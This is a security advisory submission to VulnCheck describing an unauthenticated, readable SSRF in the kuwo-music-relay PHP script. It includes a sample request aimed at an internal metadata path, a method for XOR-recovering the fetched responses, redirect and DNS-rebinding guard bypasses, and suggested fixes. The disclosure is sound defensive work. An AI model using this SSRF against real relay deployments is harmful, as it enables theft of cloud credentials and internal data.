# VulnCheck submission packet #6 — kuwo-music-relay unauthenticated SSRF

Submit at **https://vulncheck.com/advisories/report** (or **disclosures@vulncheck.com**).

### Name to be credited
Abdulloh Nuriddinov (GitHub: 4bdull0hh)

### Contact email
abdullohnuriddinov677@gmail.com

### How you came across this
Independent source review + runtime PoC (AI-assisted).

### Supplier / maintainer
cdyUuu — https://github.com/cdyUuu/kuwo-music-relay

### Affected product
**kuwo-music-relay** — single-file PHP "relay" server (`decrypt.php`) that fetches an encrypted Kuwo Music file over HTTP and streams the decrypted audio to a player.

### Affected versions / environment confirmed
`RELAY_VERSION` **1.0.0**, `main` @ `90f76911dc977bf729a8b0bb18118d4ce4c5adb8` (committed 2026-08-19; reviewed + runtime-tested 2026-10-11, PHP 8.3). Maintainer to confirm range.

### Vulnerability type
CWE-918 (Server-Side Request Forgery). Unauthenticated. Full-read (not blind).

### Suggested CVSS 3.1
`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L` → ~**8.2 High** (unauthenticated SSRF with readable responses → cloud-metadata credential theft / internal API disclosure). Maintainer/VulnCheck to finalize.

### Description
`decrypt.php` accepts two **unauthenticated** query parameters, `url` and `ekey`,
and issues cURL requests to `url`, returning the response body to the caller
after a reversible transform. There is **no authentication**, **no destination
allow-list** (nothing restricts `url` to Kuwo CDN domains), and the only SSRF
guard in the code is **disabled by the shipped default configuration**:

```php
define('RELAY_ALLOW_PRIVATE_IP', true);   // line 42 — SSRF guard is gated on this being false
...
if (!RELAY_ALLOW_PRIVATE_IP) { /* isSafeRemoteHost() check */ }   // skipped by default
```

The README advertises *"SSRF protection — blocks requests to private/reserved IP
ranges"* and tells users to deploy the file as-is, but the default build does not
run that check. An unauthenticated attacker can make the server request arbitrary
internal/cloud endpoints (`http://169.254.169.254/…`, `http://127.0.0.1:…`,
internal admin APIs).

The SSRF is **readable**: the fetched bytes are returned as
`decrypt($data, $offset)`, and both QMC cipher implementations are keystream-XOR
(`MapCipher`: `return $data ^ $keystream;`; `Rc4Cipher`: keystream XOR). The
keystream is derived **only** from the attacker-supplied `ekey`, so the attacker
reproduces it and recovers the fetched internal response verbatim
(`fetched = server_output XOR keystream(ekey)`).

Even if an operator sets `RELAY_ALLOW_PRIVATE_IP = false`, the guard is
bypassable: every cURL handle sets `CURLOPT_FOLLOWLOCATION => true` and never
re-validates the redirect target (an attacker's public URL can `302` to an
internal address), and `isSafeRemoteHost()` resolves with `gethostbynamel()`
while cURL re-resolves on connect (DNS-rebinding TOCTOU) — and returns *allow*
for names that don't resolve at check time.

### Proof of concept (runtime-confirmed)
**Part A — the forged request fires (default config, unauthenticated):**
```
GET /decrypt.php?url=http://127.0.0.1:19999/latest/meta-data/iam-...&ekey=<120 chars>
Range: bytes=0-63
```
Observed on the throwaway "internal" service:
```
HIT from 127.0.0.1  UA=Mozilla/5.0 (Windows NT 10.0; …) Chrome/120 …  PATH=/latest/meta-data/iam-...
```
The `User-Agent` is the relay's hard-coded `getCdnHeaders()` string, proving the
**relay** made the request. (It reaches the fetch via
`streamRangeFromCDN → getRemoteFileSize($url)`, before `ekey` is validated, so the
request fires regardless of `ekey`.)

**Part B — the response is recoverable (project's own ciphers):**
```
server_output = cipher->decrypt(fetched, offset)
keystream     = cipher->decrypt("\0" x len, offset)   # attacker reproduces from ekey
recovered     = server_output XOR keystream
→ [MapCipher] recovered === fetched ? YES
→ [Rc4Cipher] recovered === fetched ? YES
```

PoC files: `security-research/poc/kuwo-ssrf-request-poc.sh` (+ `kuwo-internal-server.php`)
and `security-research/poc/kuwo-ssrf-readability.php`.

### Suggested fix
1. Ship `RELAY_ALLOW_PRIVATE_IP = false` by default.
2. Allow-list `url` to Kuwo CDN domains, re-validated after every redirect hop.
3. Disable/redir-restrict `CURLOPT_FOLLOWLOCATION` and re-run the host check per hop.
4. Resolve once, reject if any resolved IP is private/reserved, pin the connection
   to the vetted IP (defeat DNS rebinding); treat unresolvable hosts as *deny*.
5. Consider requiring a shared secret — a public unauthenticated URL-fetcher is an open proxy.

### Caveat (stated honestly)
Part A is confirmed at runtime on the unmodified file with default config. Part B
is proven as a property of the project's own cipher classes (so, with attacker
control of `ekey`, the fetched bytes are recoverable); a full end-to-end "read
real cloud metadata through the relay with a genuine Kuwo `ekey`" was not run on a
live cloud host — but neither the SSRF nor the XOR-invertibility depends on a
specific `ekey`. The redirect-follow and DNS-rebinding bypasses (for the hardened
non-default config) are identified from the code and not separately scripted.

### References
- https://github.com/cdyUuu/kuwo-music-relay (`main` @ `90f7691`)
- Full write-up: `security-research/kuwo-music-relay-unauth-ssrf.md`
